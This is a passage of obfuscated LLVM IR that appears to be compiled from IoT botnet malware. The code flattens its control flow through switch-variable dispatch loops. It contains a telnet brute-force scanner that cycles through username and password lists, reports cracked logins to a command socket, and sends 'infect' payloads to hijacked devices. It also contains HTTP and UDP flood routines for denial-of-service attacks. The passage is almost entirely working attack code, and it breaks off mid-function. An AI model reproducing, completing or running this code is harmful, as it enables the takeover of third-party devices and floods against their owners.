; <label>:577:                                    ; preds = %loopEntry
  %578 = load i32, i32* %1, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 9
  %582 = load i8*, i8** %581, align 8
  %583 = call i32 @contains_success(i8* %582)
  %584 = icmp ne i32 %583, 0
  %585 = select i1 %584, i32 809173975, i32 130389304
  store i32 %585, i32* %switchVar
  br label %loopEnd

; <label>:586:                                    ; preds = %loopEntry
  %587 = load i32, i32* %1, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 3
  %591 = load i8, i8* %590, align 1
  %592 = zext i8 %591 to i32
  %593 = icmp eq i32 %592, 2
  %594 = select i1 %593, i32 1406380376, i32 1778631701
  store i32 %594, i32* %switchVar
  br label %loopEnd

; <label>:595:                                    ; preds = %loopEntry
  %596 = load i32, i32* %1, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %597
  call void @advance_state(%struct.telstate_t* %598, i32 7)
  store i32 -1930977388, i32* %switchVar
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  %600 = load i32, i32* @mainCommSock, align 4
  %601 = load i32, i32* %1, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %602
  %604 = call i8* @get_telstate_host(%struct.telstate_t* %603)
  %605 = load i32, i32* %1, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 4
  %609 = load i8, i8* %608, align 2
  %610 = zext i8 %609 to i64
  %611 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %610
  %612 = load i8*, i8** %611, align 8
  %613 = load i32, i32* %1, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 5
  %617 = load i8, i8* %616, align 1
  %618 = zext i8 %617 to i64
  %619 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %618
  %620 = load i8*, i8** %619, align 8
  %621 = call i32 (i32, i8*, ...) @sockprintf(i32 %600, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.308, i32 0, i32 0), i8* %604, i8* %612, i8* %620)
  %622 = load i32, i32* %1, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %623
  call void @advance_state(%struct.telstate_t* %624, i32 7)
  store i32 -1930977388, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  store i32 -1141860344, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  %627 = load i32, i32* %1, align 4
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %628
  call void @reset_telstate(%struct.telstate_t* %629)
  store i32 -1141860344, i32* %switchVar
  br label %loopEnd

; <label>:630:                                    ; preds = %loopEntry
  store i32 646272934, i32* %switchVar
  br label %loopEnd

; <label>:631:                                    ; preds = %loopEntry
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:632:                                    ; preds = %loopEntry
  %633 = load i32, i32* %1, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 7
  %637 = load i32, i32* %636, align 16
  %638 = add i32 %637, 7
  %639 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %640 = icmp ult i32 %638, %639
  %641 = select i1 %640, i32 1023087260, i32 512010778
  store i32 %641, i32* %switchVar
  br label %loopEnd

; <label>:642:                                    ; preds = %loopEntry
  %643 = load i32, i32* %1, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %644
  call void @reset_telstate(%struct.telstate_t* %645)
  store i32 512010778, i32* %switchVar
  br label %loopEnd

; <label>:646:                                    ; preds = %loopEntry
  store i32 -530316569, i32* %switchVar
  br label %loopEnd

; <label>:647:                                    ; preds = %loopEntry
  %648 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %649 = load i32, i32* %1, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %650
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %651, i32 0, i32 7
  store i32 %648, i32* %652, align 16
  %653 = load i32, i32* %1, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 0
  %657 = load i32, i32* %656, align 16
  %658 = call i64 @send(i32 %657, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0), i64 4, i32 16384)
  %659 = icmp slt i64 %658, 0
  %660 = select i1 %659, i32 -2127298093, i32 2058447376
  store i32 %660, i32* %switchVar
  br label %loopEnd

; <label>:661:                                    ; preds = %loopEntry
  store i32 2058447376, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  %663 = load i32, i32* %1, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 0
  %667 = load i32, i32* %666, align 16
  %668 = call i64 @send(i32 %667, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.310, i32 0, i32 0), i64 7, i32 16384)
  %669 = icmp slt i64 %668, 0
  %670 = select i1 %669, i32 556024474, i32 276009398
  store i32 %670, i32* %switchVar
  br label %loopEnd

; <label>:671:                                    ; preds = %loopEntry
  store i32 276009398, i32* %switchVar
  br label %loopEnd

; <label>:672:                                    ; preds = %loopEntry
  %673 = load i32, i32* %1, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 0
  %677 = load i32, i32* %676, align 16
  %678 = load i8*, i8** @infect, align 8
  %679 = load i8*, i8** @infect, align 8
  %680 = call i64 @strlen(i8* %679) #10
  %681 = call i64 @send(i32 %677, i8* %678, i64 %680, i32 16384)
  %682 = icmp slt i64 %681, 0
  %683 = select i1 %682, i32 -80114356, i32 -1450828027
  store i32 %683, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  %685 = load i32, i32* %1, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %686
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %687, i32 0, i32 0
  %689 = load i32, i32* %688, align 16
  %690 = load i8*, i8** @infect2, align 8
  %691 = load i8*, i8** @infect2, align 8
  %692 = call i64 @strlen(i8* %691) #10
  %693 = call i64 @send(i32 %689, i8* %690, i64 %692, i32 16384)
  %694 = icmp slt i64 %693, 0
  %695 = select i1 %694, i32 1940259574, i32 1896588110
  store i32 %695, i32* %switchVar
  br label %loopEnd

; <label>:696:                                    ; preds = %loopEntry
  %697 = load i32, i32* %1, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %698
  call void @reset_telstate(%struct.telstate_t* %699)
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:700:                                    ; preds = %loopEntry
  store i32 -1450828027, i32* %switchVar
  br label %loopEnd

; <label>:701:                                    ; preds = %loopEntry
  %702 = load i32, i32* %1, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 0
  %706 = load i32, i32* %705, align 16
  %707 = load i32, i32* %7, align 4
  %708 = load i32, i32* %1, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 9
  %712 = load i8*, i8** %711, align 8
  %713 = call i32 @read_until_response(i32 %706, i32 %707, i8* %712, i32 512, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infected, i32 0, i32 0))
  %714 = icmp ne i32 %713, 0
  %715 = select i1 %714, i32 -191343010, i32 -235621126
  store i32 %715, i32* %switchVar
  br label %loopEnd

; <label>:716:                                    ; preds = %loopEntry
  %717 = load i32, i32* %1, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %718
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %719, i32 0, i32 9
  %721 = load i8*, i8** %720, align 8
  %722 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8**, ...)*)(i8* %721, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infectedmessage, i32 0, i32 0))
  %723 = icmp ne i32 %722, 0
  %724 = select i1 %723, i32 -2127307352, i32 208833226
  store i32 %724, i32* %switchVar
  br label %loopEnd

; <label>:725:                                    ; preds = %loopEntry
  %726 = load i32, i32* %1, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %727
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %728, i32 0, i32 3
  %730 = load i8, i8* %729, align 1
  %731 = zext i8 %730 to i32
  %732 = icmp ne i32 %731, 3
  %733 = select i1 %732, i32 -687273130, i32 208833226
  store i32 %733, i32* %switchVar
  br label %loopEnd

; <label>:734:                                    ; preds = %loopEntry
  %735 = load i32, i32* @mainCommSock, align 4
  %736 = load i32, i32* %1, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %737
  %739 = call i8* @get_telstate_host(%struct.telstate_t* %738)
  %740 = load i32, i32* %1, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %742, i32 0, i32 4
  %744 = load i8, i8* %743, align 2
  %745 = zext i8 %744 to i64
  %746 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %745
  %747 = load i8*, i8** %746, align 8
  %748 = load i32, i32* %1, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %749
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %750, i32 0, i32 5
  %752 = load i8, i8* %751, align 1
  %753 = zext i8 %752 to i64
  %754 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %753
  %755 = load i8*, i8** %754, align 8
  %756 = call i32 (i32, i8*, ...) @sockprintf(i32 %735, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.311, i32 0, i32 0), i8* %739, i8* %747, i8* %755)
  %757 = load i32, i32* %1, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 3
  store i8 3, i8* %760, align 1
  store i32 208833226, i32* %switchVar
  br label %loopEnd

; <label>:761:                                    ; preds = %loopEntry
  store i32 -235621126, i32* %switchVar
  br label %loopEnd

; <label>:762:                                    ; preds = %loopEntry
  %763 = load i32, i32* %1, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %764
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %765, i32 0, i32 7
  %767 = load i32, i32* %766, align 16
  %768 = add i32 %767, 8
  %769 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %770 = icmp ult i32 %768, %769
  %771 = select i1 %770, i32 1832921008, i32 331533551
  store i32 %771, i32* %switchVar
  br label %loopEnd

; <label>:772:                                    ; preds = %loopEntry
  %773 = load i32, i32* %1, align 4
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %774
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %775, i32 0, i32 3
  %777 = load i8, i8* %776, align 1
  %778 = zext i8 %777 to i32
  %779 = icmp ne i32 %778, 3
  %780 = select i1 %779, i32 926577276, i32 -252493545
  store i32 %780, i32* %switchVar
  br label %loopEnd

; <label>:781:                                    ; preds = %loopEntry
  store i32 -252493545, i32* %switchVar
  br label %loopEnd

; <label>:782:                                    ; preds = %loopEntry
  %783 = load i32, i32* %1, align 4
  %784 = sext i32 %783 to i64
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %784
  call void @reset_telstate(%struct.telstate_t* %785)
  store i32 331533551, i32* %switchVar
  br label %loopEnd

; <label>:786:                                    ; preds = %loopEntry
  store i32 -530316569, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -530316569, i32* %switchVar
  br label %loopEnd

; <label>:787:                                    ; preds = %loopEntry
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:788:                                    ; preds = %loopEntry
  %789 = load i32, i32* %1, align 4
  %790 = add nsw i32 %789, 1
  store i32 %790, i32* %1, align 4
  store i32 -1383061144, i32* %switchVar
  br label %loopEnd

; <label>:791:                                    ; preds = %loopEntry
  store i32 -2098544457, i32* %switchVar
  br label %loopEnd

; <label>:792:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %791, %788, %787, %NewDefault, %786, %782, %781, %772, %762, %761, %734, %725, %716, %701, %700, %696, %684, %672, %671, %662, %661, %647, %646, %642, %632, %631, %630, %626, %625, %599, %595, %586, %577, %573, %559, %544, %540, %536, %527, %523, %497, %496, %492, %482, %481, %477, %473, %464, %449, %445, %441, %432, %428, %402, %401, %397, %387, %386, %382, %378, %369, %354, %353, %349, %339, %338, %334, %330, %329, %312, %308, %297, %263, %262, %253, %252, %251, %247, %243, %238, %215, %214, %189, %188, %187, %182, %173, %168, %147, %138, %118, %110, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %94, %88, %80, %75, %74, %73, %72, %71, %63, %62, %59, %45, %40, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 1487801661, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1487801661, label %first
    i32 823545236, label %14
    i32 -594874022, label %15
    i32 431115917, label %38
    i32 -2063035394, label %39
    i32 1429540077, label %45
    i32 1926266360, label %46
    i32 256388730, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 823545236, i32 -594874022
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 256388730, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #5
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #5
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 431115917, i32 -2063035394
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 256388730, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 1429540077, i32 1926266360
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 256388730, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 256388730, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #4

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [62 x i8*], align 16
  %14 = alloca [3 x i8*], align 16
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = bitcast [62 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %19, i8* bitcast ([62 x i8*]* @sendHTTP.useragents to i8*), i64 496, i32 16, i1 false)
  %20 = bitcast [3 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %20, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %21, %22
  store i32 %23, i32* %16, align 4
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %25 = load i8*, i8** %8, align 8
  %26 = load i8*, i8** %10, align 8
  %27 = call i32 @rand() #5
  %28 = srem i32 %27, 3
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* %14, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @rand() #5
  %33 = srem i32 %32, 65
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [62 x i8*], [62 x i8*]* %13, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %24, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.377, i32 0, i32 0), i8* %25, i8* %26, i8* %31, i8* %36) #5
  store i32 0, i32* %15, align 4
  %switchVar = alloca i32
  store i32 1184774876, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1184774876, label %38
    i32 -1533264094, label %43
    i32 -1191080787, label %47
    i32 -1022399759, label %48
    i32 1182017536, label %53
    i32 -1443866625, label %60
    i32 -737651260, label %68
    i32 2053343585, label %69
    i32 196845575, label %70
    i32 -859342269, label %71
    i32 979070213, label %74
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %15, align 4
  %40 = load i32, i32* %12, align 4
  %41 = icmp slt i32 %39, %40
  %42 = select i1 %41, i32 -1533264094, i32 979070213
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = call i32 @fork() #5
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -1191080787, i32 196845575
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -1022399759, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %16, align 4
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = icmp sgt i32 %49, %50
  %52 = select i1 %51, i32 1182017536, i32 2053343585
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i8*, i8** %7, align 8
  %55 = load i16, i16* %9, align 2
  %56 = call i32 @socket_connect(i8* %54, i16 zeroext %55)
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -1443866625, i32 -737651260
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %18, align 4
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %64 = call i64 @strlen(i8* %63) #10
  %65 = call i64 @write(i32 %61, i8* %62, i64 %64)
  %66 = load i32, i32* %18, align 4
  %67 = call i32 @close(i32 %66)
  store i32 -737651260, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -1022399759, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @_exit(i32 1) #12
  unreachable

; <label>:70:                                     ; preds = %loopEntry
  store i32 -859342269, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %15, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %15, align 4
  store i32 1184774876, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %71, %70, %68, %60, %53, %48, %47, %43, %38, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #2

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #5
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 -1793298244, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1793298244, label %39
    i32 -377275607, label %49
    i32 -279481371, label %64
    i32 -1746599535, label %67
    i32 734498469, label %68
    i32 -111469241, label %71
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #5
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  %48 = select i1 %47, i32 -377275607, i32 734498469
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %7, align 4
  %51 = load i8*, i8** %13, align 8
  %52 = call i64 @send(i32 %50, i8* %51, i64 75, i32 0)
  %53 = load i32, i32* %7, align 4
  %54 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %55 = call i32 @connect(i32 %53, %struct.sockaddr* %54, i32 16)
  %56 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %57 = sext i32 %56 to i64
  %58 = load i64, i64* %8, align 8
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = icmp sge i64 %57, %61
  %63 = select i1 %62, i32 -279481371, i32 -1746599535
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %7, align 4
  %66 = call i32 @close(i32 %65)
  call void @_exit(i32 0) #12
  unreachable

; <label>:67:                                     ; preds = %loopEntry
